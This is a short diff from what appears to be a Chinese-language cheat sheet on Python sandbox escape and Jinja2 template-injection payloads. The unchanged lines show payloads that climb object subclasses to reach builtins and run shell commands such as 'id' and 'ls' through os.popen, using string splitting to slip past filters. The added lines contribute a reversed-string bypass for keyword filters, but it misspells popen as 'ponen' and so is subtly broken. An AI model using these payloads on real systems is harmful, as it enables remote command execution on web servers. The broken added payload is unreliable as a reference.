@@ -1758,6 +1758,9 @@ __builtins__      内建模块的引用，在任何地方都是可见的(包括�
     [].__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__'].__builtins__.eval("__import__('os').popen('id').read()")
     [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
     [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
+
+    # 逆序绕过关键字过滤
+    {{config.__init__['__slabolg__'[::-1]]['os'].ponen('ls').read()}}
     
     # 利用site._Printer类
     [].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()
